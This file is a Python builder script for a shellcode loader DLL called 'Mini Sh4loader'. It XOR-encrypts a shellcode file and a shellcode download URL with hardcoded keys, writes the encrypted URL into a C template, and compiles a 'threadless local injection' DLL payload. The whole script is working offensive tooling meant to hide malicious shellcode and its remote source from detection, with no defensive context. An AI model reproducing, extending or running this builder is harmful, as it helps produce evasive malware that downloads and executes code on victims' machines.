#!/usr/bin/env python3
import argparse
import shutil
import os
import subprocess
import sys
banner = """
##############################################################
######               Mini Sh4loader DLL                 ######
##############################################################
"""
key = [
    0x67,
    0x1B,
    0x79,
    0xCC,
    0x1A,
    0xD4,
    0x5E,
    0xCD,
    0xA1,
    0x3E,
    0x1B,
    0x97,
    0x47,
    0x1C,
    0x47,
    0xF8,
]


def execute_commands(commands, working_directory):
    os.chdir(working_directory)

    for command in commands:
        try:
            result = subprocess.run(
                command,
                shell=True,
                check=True,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )


        except subprocess.CalledProcessError as e:
            print(f"[-] Command '{command}' failed with return code {e.returncode}")
            print("[-] Error Output:")
            print(e.stderr)


def url_to_bytearray(url):
    return bytearray(url.encode("utf-8"))


def bytearray_to_c_array(b_array):
    return ", ".join(f"0x{byte:02X}" for byte in b_array)


def long_key():
    key_string = "08080408"
    return bytes.fromhex(key_string)


def xor32(buf):
    xor_key = long_key()

    for i in range(len(buf)):
        # XOR each byte with the corresponding byte from the xor_key
        buf[i] ^= xor_key[i % len(xor_key)]


def xor(buffer: bytearray, key: bytes) -> None:
    # key_size = len(key)
    for i in range(len(buffer)):
        # j = i % key_size
        buffer[i] ^= key[i % len(key)]


def printShellcode(shellcode):
    # Convert shellcode to hex bytes format with a maximum of 16 bytes per line
    hex_bytes = [f"0x{x:02X}" for x in shellcode]
    num_bytes = len(hex_bytes)
    num_rows = (num_bytes + 15) // 16

    # Print the hex bytes format with a maximum of 16 bytes per line
    print(f"[i] encrypted shellcode in hex bytes format:\n")
    print("unsigned char shellcodeBytes[] = {")
    for i in range(num_rows):
        row_start = i * 16
        row_end = min(row_start + 16, num_bytes)
        row_hex = ", ".join(hex_bytes[row_start:row_end])
        if i == num_rows - 1:
            # Remove the last comma for the last row
            print(f"    {row_hex}")
        else:
            print(f"    {row_hex},")
    print("};\n")


def encrypt_shellcode(shellcode_file, output_file):
    with open(shellcode_file, "rb") as f:
        shellcode = bytearray(f.read())
    xor32(shellcode)
    xor(shellcode, key)
    with open(output_file, "wb") as of:
        of.write(shellcode)


def encrypt_and_replace(url):
    b_array = url_to_bytearray(url)
    xor(b_array, key)
    c_array = bytearray_to_c_array(b_array)
    with open("./src/main_", "r") as file:
        content = file.readlines()
    for i, line in enumerate(content):
        if "{REPLACE}" in line:
            content[i] = line.replace("{REPLACE}", "{" + c_array + "}")
    with open("./src/main.c", "w") as file:
        file.writelines(content)


def main():
    parser = argparse.ArgumentParser(description="Simple Loader")
    parser.add_argument(
        "-u",
        "--url",
        type=str,
        help="Shellcode download Url",
        action="store",
        required=True,
    )
    parser.add_argument(
        "-f", "--file", type=str, help="Shellcode file", action="store", required=True
    )
    parser.add_argument(
        "-pf", "--payloadfile", type=str, help="payload file", action="store", required=True
    )
    parser.add_argument(
        "-o",
        "--outfile",
        type=str,
        help="Encrypted shellcode output file",
        action="store",
        required=True,
    )
    args = parser.parse_args()
    shellcode_url = args.url
    shellcode_file = args.file
    payload_file = args.payloadfile
    output_file = args.outfile

    encrypt_shellcode(shellcode_file, output_file)
    print(f"[+] encrypted shellcode save at: {output_file} ")

    print(f"[+] adding encrypted URL")
    encrypt_and_replace(shellcode_url)
    commands = ["make threadless_local_injection_dll"]

    working_directory = "./"
    print(f"[+] complier")
    execute_commands(commands, working_directory)
    shutil.copy("./local.dll", payload_file)
    print(f"[+] the payload saved at {payload_file}")

if __name__ == "__main__":
    print(banner)
    main()
